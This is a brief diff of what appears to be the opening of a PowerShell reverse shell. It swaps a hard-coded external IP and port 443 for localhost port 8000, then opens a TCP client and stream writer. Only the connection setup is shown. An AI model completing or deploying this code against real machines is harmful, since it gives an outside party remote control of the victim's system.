@@ -1,5 +1,5 @@
-$ip = "37.61.221.153"
-$port = 443
+$ip = "127.0.0.1"
+$port = 8000
 $tcpclient = New-Object System.Net.Sockets.TcpClient($ip, $port) 2>$null
 $stream = $tcpclient.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
